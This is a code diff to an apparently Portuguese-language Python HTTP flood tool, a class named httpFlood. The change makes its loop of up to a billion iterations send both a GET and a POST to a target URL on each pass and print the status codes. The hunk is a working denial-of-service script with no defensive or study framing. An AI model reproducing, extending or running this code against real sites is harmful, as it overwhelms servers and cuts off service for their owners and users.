@@ -35,8 +35,10 @@ class httpFlood:
 					exit()
 				
 				for i in range(1, 1000000000):
-					rqs = requests.get(ip_url)
-					print(Fore.GREEN+f"status do flood:", rqs.status_code, f"{i}"+Style.RESET_ALL)
+					get_atack = requests.get(ip_url)
+					post_atack = requests.post(ip_url)
+					print(Fore.GREEN+f"status do flood:", get_atack.status_code,f"{i}"+Style.RESET_ALL)
+					print(Fore.GREEN+f"status do flood:", post_atack.status_code,f"{i}"+Style.RESET_ALL)
 					
 			except KeyboardInterrupt:
 				print(Fore.RED+"saindo..."+Style.RESET_ALL)
